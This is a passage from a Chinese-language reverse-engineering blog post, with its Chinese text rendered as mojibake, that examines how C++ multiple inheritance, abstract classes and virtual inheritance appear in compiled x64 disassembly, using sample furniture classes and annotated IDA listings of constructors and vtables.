class="line">  <span class="type">int</span> width;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å­ç±»æ²™å‘åºŠå®šä¹‰ï¼Œæ´¾ç”Ÿè‡ª Sofa ç±»å’Œ Bed ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SofaBed</span> :</span> public Sofa, public Bed &#123;</span><br><span class="line">public:</span><br><span class="line">  SofaBed() &#123;</span><br><span class="line">    height = <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~SofaBed() &#123;    <span class="comment">//æ²™å‘åºŠç±»çš„è™šææ„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual ~SofaBed()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sitDown</span><span class="params">()</span> &#123;    <span class="comment">//æ²™å‘å¯ä»¥åä¸‹ä¼‘æ¯</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Sit down on the sofa bed\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;    <span class="comment">//åºŠå¯ä»¥ç”¨æ¥ç¡è§‰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;go to sleep on the sofa bed\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> height;</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  SofaBed sofabed;</span><br><span class="line">  Sofa* sofa = &amp;sofabed;</span><br><span class="line">  Bed* bed = &amp;sofabed;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•°æ®æˆå‘˜çš„æ’åˆ—é¡ºåºç”±ç»§æ‰¿çˆ¶ç±»çš„é¡ºåºå†³å®šï¼Œä»å·¦å‘å³ä¾æ¬¡æ’åˆ—ã€‚</p><p>å­ç±»ä¸­å®ç°çš„è™šå‡½æ•°ä¼šåœ¨è™šè¡¨é‡Œæ›¿æ¢ï¼Œæ²¡å®ç°çš„ä¾æ—§æ˜¯çˆ¶ç±»è™šå‡½æ•°</p><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026120014414.png" alt="image-20231026120014414"></p><blockquote><p>vs2022é‡Œçš„ç›‘è§†çª—å£ä¸æ˜¯çœŸå®å†…å­˜å¸ƒå±€ï¼Œåªä¸è¿‡è¿™æ¬¡å‡‘å·§ä¸€æ ·,è¿˜æ˜¯è¦ä»å†…å­˜çª—å£çœ‹</p></blockquote><p>æ„é€ å‡½æ•°ä¼šæŠŠthisæŒ‡é’ˆè°ƒæ•´åˆ°å„ä¸ªçˆ¶ç±»éƒ¨åˆ†ï¼Œè°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œç„¶åå†æŠŠSofaBedçš„è™šè¡¨æŒ‡é’ˆèµ‹å€¼åˆ°å„ä¸ªçˆ¶ç±»éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001620    ; __unwind &#123; // __CxxFrameHandler4_0</span><br><span class="line">.text:0000000140001620    mov     [rsp+arg_0], rcx</span><br><span class="line">.text:0000000140001625    sub     rsp, 28h</span><br><span class="line">.text:0000000140001629    mov     rcx, [rsp+28h+arg_0]            ; this</span><br><span class="line">.text:000000014000162E    call    j_??0Sofa@@QEAA@XZ              ; Sofa::Sofa(void)</span><br><span class="line">.text:000000014000162E</span><br><span class="line">.text:0000000140001633    nop</span><br><span class="line">.text:0000000140001634    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:0000000140001639    add     rax, 10h                        ;è°ƒæ•´åˆ°Bed thisä½ç½®</span><br><span class="line">.text:000000014000163D    mov     rcx, rax                        ; this</span><br><span class="line">.text:0000000140001640    call    j_??0Bed@@QEAA@XZ               ; Bed::Bed(void)</span><br><span class="line">.text:0000000140001640</span><br><span class="line">.text:0000000140001645    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:000000014000164A    lea     rcx, ??_7SofaBed@@6BSofa@@@     ; const SofaBed::`vftable&#x27;&#123;for `Sofa&#x27;&#125;</span><br><span class="line">.text:0000000140001651    mov     [rax], rcx</span><br><span class="line">.text:0000000140001654    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:0000000140001659    lea     rcx, ??_7SofaBed@@6BBed@@@      ; const SofaBed::`vftable&#x27;&#123;for `Bed&#x27;&#125;</span><br><span class="line">.text:0000000140001660    mov     [rax+10h], rcx</span><br><span class="line">.text:0000000140001664    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:0000000140001669    mov     dword ptr [rax+20h], 6</span><br><span class="line">.text:0000000140001670    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:0000000140001675    add     rsp, 28h</span><br><span class="line">.text:0000000140001679    retn</span><br><span class="line">.text:0000000140001679    ; &#125; // starts at 140001620</span><br></pre></td></tr></table></figure><p>ææ„å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·å¥—è·¯ï¼Œä¸è¿‡æ˜¯å…ˆæŠŠSofaBedçš„è™šè¡¨æŒ‡é’ˆèµ‹å€¼åˆ°å„ä¸ªçˆ¶ç±»éƒ¨åˆ†è°ƒç”¨ææ„å‡½æ•°ï¼Œåœ¨æŠŠthisæŒ‡é’ˆè°ƒæ•´åˆ°å„ä¸ªçˆ¶ç±»éƒ¨åˆ†ï¼Œè°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°</p><p>æŒ‡é’ˆèµ‹å€¼ä¹Ÿæ˜¯ä¸€æ ·çš„å¥—è·¯</p><h2 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractBase</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  AbstractBase() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AbstractBase()&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> = <span class="number">0</span>;    <span class="comment">//å®šä¹‰çº¯è™šå‡½æ•°</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualChild</span> :</span> public AbstractBase &#123;    <span class="comment">//å®šä¹‰ç»§æ‰¿æŠ½è±¡ç±»çš„å­ç±»</span></span><br><span class="line">public:</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;    <span class="comment">//å®ç°çº¯è™šå‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æŠ½è±¡ç±»åˆ†æ\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  VirtualChild obj;</span><br><span class="line">  obj.show();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çº¯è™šå‡½æ•°çš„è™šè¡¨é¡¹ä¸º_purecall_0ï¼Œæ˜¯ç¼–è¯‘å™¨ä¿è¯æœªå®šä¹‰çš„çº¯è™šå‡½æ•°è¢«è°ƒç”¨æä¾›çš„ç”¨äºç»“æŸç¨‹åºçš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.rdata:<span class="number">0000000140007B</span>B8 DE <span class="number">15</span> <span class="number">00</span> <span class="number">40</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+??_7AbstractBase@@<span class="number">6B</span>@ dq offset _purecall_0, <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="è™šç»§æ‰¿-è±å½¢ç»§æ‰¿"><a href="#è™šç»§æ‰¿-è±å½¢ç»§æ‰¿" class="headerlink" title="è™šç»§æ‰¿(è±å½¢ç»§æ‰¿)"></a>è™šç»§æ‰¿(è±å½¢ç»§æ‰¿)</h2><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026123306196.png" alt="image-20231026123306196"></p><p>ä»è¿™ä½å¤§å“¥:<a href="https://lonelyenderman.top/archives/723">https://lonelyenderman.top/archives/723</a> å·æ¥çš„å›¾ï¼Œæ„Ÿè§‰æ¯”è¾ƒæœ‰æ„æ€</p><p>ç¾Šå’Œé©¼éƒ½ç»§æ‰¿äº†åŠ¨ç‰©çš„ç±»æˆå‘˜ï¼Œå½“ç¾Šé©¼æƒ³è¦ä½¿ç”¨æ—¶ï¼Œä¼šäº§ç”Ÿæ•°æ®å†—ä½™å’ŒäºŒä¹‰æ€§ï¼Œå¼•å‡ºäº†è™šç»§æ‰¿</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰å®¶å…·ç±»ï¼Œè™šåŸºç±»ï¼Œç­‰åŒäºç±» ç¾Šé©¼</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Furniture</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Furniture() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Furniture::Furniture()\n&quot;</span>);</span><br><span class="line">    price = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual ~Furniture() &#123;    <span class="comment">//å®¶å…·ç±»çš„è™šææ„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Furniture::~Furniture()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;    <span class="comment">//è·å–å®¶å…·ä»·æ ¼</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Furniture::getPrice()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> price;</span><br><span class="line">  &#125;;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> price;    <span class="comment">//å®¶å…·ç±»çš„æˆå‘˜å˜é‡</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰æ²™å‘ç±»ï¼Œç»§æ‰¿è‡ªç±» Furnitureï¼Œç­‰åŒäºç±» ç¾Š</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sofa</span> :</span> virtual public Furniture &#123;</span><br><span class="line">public:</span><br><span class="line">  Sofa() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sofa::Sofa()\n&quot;</span>);</span><br><span class="line">    price = <span class="number">1</span>;</span><br><span class="line">    color = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual ~Sofa() &#123;    <span class="comment">//æ²™å‘ç±»è™šææ„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sofa::~Sofa()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getColor</span><span class="params">()</span> &#123;    <span class="comment">//è·å–æ²™å‘é¢œè‰²</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sofa::getColor()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> color;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sitDown</span><span class="params">()</span> &#123;    <span class="comment">//æ²™å‘å¯ä»¥åä¸‹ä¼‘æ¯</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Sofa::sitDown()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> color;    <span class="comment">// æ²™å‘ç±»æˆå‘˜å˜é‡</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰åºŠç±»ï¼Œç»§æ‰¿è‡ªç±» Furnitureï¼Œç­‰åŒäºç±» é©¼</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bed</span> :</span> virtual public Furniture &#123;</span><br><span class="line">public:</span><br><span class="line">  Bed() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bed::Bed()\n&quot;</span>);</span><br><span class="line">    price = <span class="number">3</span>;</span><br><span class="line">    length = <span class="number">4</span>;</span><br><span class="line">    width = <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~Bed() &#123;    <span class="comment">//åºŠç±»çš„è™šææ„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bed::~Bed()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getArea</span><span class="params">()</span> &#123;    <span class="comment">//è·å–åºŠé¢ç§¯</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bed::getArea()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> length * width;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;    <span class="comment">//åºŠå¯ä»¥ç”¨æ¥ç¡è§‰</span></span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">printf</span>(<span class="string">&quot;Bed::sleep()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> length;    <span class="comment">//åºŠç±»æˆå‘˜å˜é‡</span></span><br><span class="line">  <span class="type">int</span> width;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å­ç±»æ²™å‘åºŠçš„å®šä¹‰ï¼Œæ´¾ç”Ÿè‡ªç±» Sofa å’Œç±» Bedï¼Œç­‰åŒäºç±» ç¾Šé©¼</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SofaBed</span> :</span> public Sofa, public Bed &#123;</span><br><span class="line">public:</span><br><span class="line">  SofaBed() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::SofaBed()\n&quot;</span>);</span><br><span class="line">    height = <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual ~SofaBed() &#123;    <span class="comment">//æ²™å‘åºŠç±»çš„è™šææ„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::~SofaBed()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sitDown</span><span class="params">()</span> &#123;    <span class="comment">//æ²™å‘å¯ä»¥åä¸‹ä¼‘æ¯</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::sitDown()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;    <span class="comment">//åºŠå¯ä»¥ç”¨æ¥ç¡è§‰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::sleep()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::getHeight()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> height;</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> height;    <span class="comment">//æ²™å‘ç±»çš„æˆå‘˜å˜é‡</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  SofaBed sofabed;</span><br><span class="line">  Furniture* p1 = &amp;sofabed;   <span class="comment">//è½¬æ¢æˆè™šåŸºç±»æŒ‡é’ˆ</span></span><br><span class="line">  Sofa* p2 = &amp;sofabed;        <span class="comment">//è½¬æ¢æˆçˆ¶ç±»æŒ‡é’ˆ</span></span><br><span class="line">  Bed* p3 = &amp;sofabed;         <span class="comment">//è½¬æ¢æˆçˆ¶ç±»æŒ‡é’ˆ</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p %p %p\n&quot;</span>, p1, p2, p3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sofabedå†…å­˜å¸ƒå±€"><a href="#sofabedå†…å­˜å¸ƒå±€" class="headerlink" title="sofabedå†…å­˜å¸ƒå±€"></a>sofabedå†…å­˜å¸ƒå±€</h3><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026124846358.png" alt="image-20231026124846358"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140003550 ; __int64 __fastcall main(int argc, char **argv)</span><br><span class="line">.text:0000000140003550 main proc near                          ; CODE XREF: main_0â†‘j</span><br><span class="line">.text:0000000140003550                                         ; DATA XREF: .pdata:000000014000B390â†“o</span><br><span class="line">.text:0000000140003550</span><br><span class="line">.text:0000000140003550 var_88= dword ptr -88h</span><br><span class="line">.text:0000000140003550 var_80= qword ptr -80h</span><br><span class="line">.text:0000000140003550 var_78= qword ptr -78h</span><br><span class="line">.text:0000000140003550 var_70= qword ptr -70h</span><br><span class="line">.text:0000000140003550 var_68= qword ptr -68h</span><br><span class="line">.text:0000000140003550 var_60= qword ptr -60h</span><br><span class="line">.text:0000000140003550 SofaBed= SofaBed ptr -58h</span><br><span class="line">.text:0000000140003550 arg_0= dword ptr  8</span><br><span class="line">.text:0000000140003550 arg_8= qword ptr  10h</span><br><span class="line">.text:0000000140003550</span><br><span class="line">.text:0000000140003550 mov     [rsp+arg_8], rdx</span><br><span class="line">.text:0000000140003555 mov     [rsp+arg_0], ecx</span><br><span class="line">.text:0000000140003559 sub     rsp, 0A8h</span><br><span class="line">.text:0000000140003560 mov     edx, 1                          ; æ„é€ è™šåŸºç±»çš„æ ‡å¿—ï¼š1æ„é€ ï¼Œ0ä¸æ„é€ </span><br><span class="line">.text:0000000140003565 lea     rcx, [rsp+0A8h+SofaBed]         ; this</span><br><span class="line">.text:000000014000356A call    j_??0SofaBed@@QEAA@XZ           ; SofaBed::SofaBed(void)</span><br><span class="line">.text:000000014000356A</span><br><span class="line">.text:000000014000356F lea     rax, [rsp+50h]</span><br><span class="line">.text:0000000140003574 test    rax, rax</span><br><span class="line">.text:0000000140003577 jnz     short loc_140003584             </span><br><span class="line">.text:0000000140003577</span><br><span class="line">.text:0000000140003579 mov     [rsp+0A8h+var_80], 0</span><br><span class="line">.text:0000000140003582 jmp     short loc_140003597</span><br><span class="line">.text:0000000140003582</span><br><span class="line">.text:0000000140003584 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000140003584</span><br><span class="line">.text:0000000140003584 loc_140003584:                          ; CODE XREF: main+27â†‘j</span><br><span class="line">.text:0000000140003584 mov     rax, qword ptr [rsp+0A8h+SofaBed.baseclass_0.gap8] ; å–å‡ºå¯¹è±¡Sofaè™šåŸºç±»åç§»è¡¨</span><br><span class="line">.text:0000000140003589 movsxd  rax, dword ptr [rax+4]          ; å–å‡ºå¯¹è±¡ä¸­Sofaç±»è™šåŸºç±»åç§»è¡¨ç¬¬äºŒé¡¹ï¼Œè™šåŸºç±»å¯¹è±¡é¦–åœ°å€ç›¸å¯¹äºè™šåŸºç±»åç§»è¡¨çš„åç§»å€¼ã€‚</span><br><span class="line">.text:000000014000358D lea     rax, [rsp+rax+0A8h+SofaBed.baseclass_0.gap8] ; æ‰¾åˆ°è™šåŸºç±»</span><br><span class="line">.text:0000000140003592 mov     [rsp+0A8h+var_80], rax</span><br><span class="line">.text:0000000140003592</span><br><span class="line">.text:0000000140003597</span><br><span class="line">.text:0000000140003597 loc_140003597:                          ; CODE XREF: main+32â†‘j</span><br><span class="line">.text:0000000140003597 mov     rax, [rsp+0A8h+var_80]</span><br><span class="line">.text:000000014000359C mov     [rsp+0A8h+var_60], rax          ; Furniture* p1 = &amp;sofabed;   //è½¬æ¢æˆè™šåŸºç±»æŒ‡é’ˆ</span><br><span class="line">.text:00000001400035A1 lea     rax, [rsp+0A8h+SofaBed]</span><br><span class="line">.text:00000001400035A6 mov     [rsp+0A8h+var_68], rax          ; Sofa* p2 = &amp;sofabed;        //è½¬æ¢æˆçˆ¶ç±»æŒ‡é’ˆ</span><br><span class="line">.text:00000001400035AB lea     rax, [rsp+0A8h+SofaBed]</span><br><span class="line">.text:00000001400035B0 test    rax, rax</span><br><span class="line">.text:00000001400035B3 jz      short loc_1400035C5</span><br><span class="line">.text:00000001400035B3</span><br><span class="line">.text:00000001400035B5 lea     rax, [rsp+0A8h+SofaBed]</span><br><span class="line">.text:00000001400035BA add     rax, 18h                        ; ç›´æ¥åŠ åç§»è·å–åˆ°Bedé¦–åœ°å€</span><br><span class="line">.text:00000001400035BE mov     [rsp+0A8h+var_78], rax</span><br><span class="line">.text:00000001400035C3 jmp     short loc_1400035CE</span><br><span class="line">.text:00000001400035C3</span><br><span class="line">.text:00000001400035C5 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000001400035C5</span><br><span class="line">.text:00000001400035C5 loc_1400035C5:                          ; CODE XREF: main+63â†‘j</span><br><span class="line">.text:00000001400035C5 mov     [rsp+0A8h+var_78], 0</span><br><span class="line">.text:00000001400035C5</span><br><span class="line">.text:00000001400035CE</span><br><span class="line">.text:00000001400035CE loc_1400035CE:                          ; CODE XREF: main+73â†‘j</span><br><span class="line">.text:00000001400035CE mov     rax, [rsp+0A8h+var_78]</span><br><span class="line">.text:00000001400035D3 mov     [rsp+0A8h+var_70], rax          ; Bed* p3 = &amp;sofabed;         //è½¬æ¢æˆçˆ¶ç±»æŒ‡é’ˆ</span><br><span class="line">.text:00000001400035D8 mov     r9, [rsp+0A8h+var_70]</span><br><span class="line">.text:00000001400035DD mov     r8, [rsp+0A8h+var_68]</span><br><span class="line">.text:00000001400035E2 mov     rdx, [rsp+0A8h+var_60]</span><br><span class="line">.text:00000001400035E7 lea     rcx, aPPP                       ; &quot;%p %p %p\n&quot;</span><br><span class="line">.text:00000001400035EE call    j_printf</span><br><span class="line">.text:00000001400035EE</span><br><span class="line">.text:00000001400035F3 mov     [rsp+0A8h+var_88], 0</span><br><span class="line">.text:00000001400035FB lea     rcx, [rsp+0A8h+SofaBed]         ; this</span><br><span class="line">.text:0000000140003600 call    j_??_DSofaBed@@QEAAXXZ          ; SofaBed::`vbase destructor&#x27;(void)</span><br><span class="line">.text:0000000140003600</span><br><span class="line">.text:0000000140003605 mov     eax, [rsp+0A8h+var_88]</span><br><span class="line">.text:0000000140003609 add     rsp, 0A8h</span><br><span class="line">.text:0000000140003610 retn</span><br></pre></td></tr></table></figure><p>Sofaè™šåŸºç±»åç§»è¡¨å­˜å‚¨ä¸¤ä¸ªå€¼-8 å’Œ 0x30</p><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026125459339.png" alt="image-20231026125459339"></p><ul><li>ç¬¬ä¸€é¡¹ä¸º-8ï¼Œå³è™šåŸºç±»åç§»è¡¨æ‰€å±ç±»å¯¹åº”çš„å¯¹è±¡é¦–åœ°å€ç›¸å¯¹äºè™šåŸºç±»åç§»è¡¨çš„åç§»å€¼ï¼›</li><li>ç¬¬äºŒé¡¹ä¿å­˜çš„æ˜¯è™šåŸºç±»å¯¹è±¡é¦–åœ°å€ç›¸å¯¹äºè™šåŸºç±»åç§»è¡¨çš„åç§»å€¼ã€‚</li></ul><p>è™šåŸºç±»æ”¾åˆ°äº†ä¸€ä¸ªå…¬å…±çš„ä½ç½®ï¼Œç¾Šå’Œé©¼ç±»é‡ŒåŸæœ¬å­˜æ”¾åŠ¨ç‰©çš„ä½ç½®ç°åœ¨å­˜æ”¾è™šåŸºåç§»è¡¨æŒ‡é’ˆï¼Œåˆ©ç”¨åç§»æ¥å¯»å€è™šåŸºç±»</p><p>å¤šä¸ªè™šåŸºç±»æ—¶ï¼Œä¼šåœ¨è™šåŸºç±»åç§»è¡¨ä¸­ä¾æ¬¡è®°å½•å®ƒä»¬çš„åç§»é‡ã€‚</p><h3 id="è™šç»§æ‰¿å­ç±»æ„é€ å‡½æ•°"><a href="#è™šç»§æ‰¿å­ç±»æ„é€ å‡½æ•°" class="headerlink" title="è™šç»§æ‰¿å­ç±»æ„é€ å‡½æ•°"></a>è™šç»§æ‰¿å­ç±»æ„é€ å‡½æ•°</h3><p><strong>è™šç»§æ‰¿å­ç±»æ„é€ å‡½æ•°ä¼ å…¥äº†å‚æ•°1:thisæŒ‡é’ˆï¼Œå‚æ•°2:æ„é€ è™šåŸºç±»çš„æ ‡å¿—ï¼š1æ„é€ ï¼Œ0ä¸æ„é€ ,é˜²æ­¢é‡å¤æ„é€ è™šåŸºç±»</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001860 ; void __fastcall SofaBed::SofaBed(SofaBed *this)</span><br><span class="line">.text:0000000140001860 ??0SofaBed@@QEAA@XZ proc near           ; CODE XREF: SofaBed::SofaBed(void)â†‘j</span><br><span class="line">.text:0000000140001860                                         ; DATA XREF: .pdata:000000014000B048â†“o</span><br><span class="line">.text:0000000140001860</span><br><span class="line">.text:0000000140001860 var_18= dword ptr -18h</span><br><span class="line">.text:0000000140001860 sofabed_this= qword ptr  8</span><br><span class="line">.text:0000000140001860 flag= dword ptr  10h</span><br><span class="line">.text:0000000140001860</span><br><span class="line">.text:0000000140001860 ; FUNCTION CHUNK AT .text:00000001400057E0 SIZE 0000002A BYTES</span><br><span class="line">.text:0000000140001860 ; FUNCTION CHUNK AT .text:0000000140005810 SIZE 0000001C BYTES</span><br><span class="line">.text:0000000140001860</span><br><span class="line">.text:0000000140001860 ; __unwind &#123; // __CxxFrameHandler4_0</span><br><span class="line">.text:0000000140001860 mov     [rsp+flag], edx</span><br><span class="line">.text:0000000140001864 mov     [rsp+sofabed_this], rcx</span><br><span class="line">.text:0000000140001869 sub     rsp, 38h</span><br><span class="line">.text:000000014000186D mov     [rsp+38h+var_18], 0</span><br><span class="line">.text:0000000140001875 cmp     [rsp+38h+flag], 0</span><br><span class="line">.text:000000014000187A jz      short loc_1400018B9             ; ä¸º0ä¸æ„é€ è™šåŸºç±»ï¼Œé˜²æ­¢é‡å¤æ„é€ è™šåŸºç±»</span><br><span class="line">.text:000000014000187A</span><br><span class="line">.text:000000014000187C mov     rax, [rsp+38h+sofabed_this]     ; rax=thisæŒ‡é’ˆ</span><br><span class="line">.text:0000000140001881 lea     rcx, ??_8SofaBed@@7BSofa@@@     ; const SofaBed::`vbtable&#x27;&#123;for `Sofa&#x27;&#125;</span><br><span class="line">.text:0000000140001888 mov     [rax+8], rcx                    ; è®¾ç½®çˆ¶ç±»Sofaä¸­çš„è™šåŸºç±»åç§»è¡¨</span><br><span class="line">.text:000000014000188C mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:0000000140001891 lea     rcx, ??_7SofaBed@@6BFurniture@@@+10h ; const SofaBed::`vftable&#x27;&#123;for `Furniture&#x27;&#125;</span><br><span class="line">.text:0000000140001898 mov     [rax+20h], rcx                  ; è®¾ç½®çˆ¶ç±»Bedä¸­çš„è™šåŸºç±»åç§»</span><br><span class="line">.text:000000014000189C mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:00000001400018A1 add     rax, 38h ; &#x27;8&#x27;                  ; è°ƒæ•´thisæŒ‡é’ˆä¸ºè™šåŸºç±»thisæŒ‡é’ˆ</span><br><span class="line">.text:00000001400018A5 mov     rcx, rax                        ; this</span><br><span class="line">.text:00000001400018A8 call    j_??0Furniture@@QEAA@XZ         ; Furniture::Furniture(void)</span><br><span class="line">.text:00000001400018A8</span><br><span class="line">.text:00000001400018AD nop</span><br><span class="line">.text:00000001400018AE mov     eax, [rsp+38h+var_18]           ; eax=0</span><br><span class="line">.text:00000001400018B2 or      eax, 1                          ; eax=1</span><br><span class="line">.text:00000001400018B5 mov     [rsp+38h+var_18], eax</span><br><span class="line">.text:00000001400018B5</span><br><span class="line">.text:00000001400018B9</span><br><span class="line">.text:00000001400018B9 loc_1400018B9:                          ; CODE XREF: SofaBed::SofaBed(void)+1Aâ†‘j</span><br><span 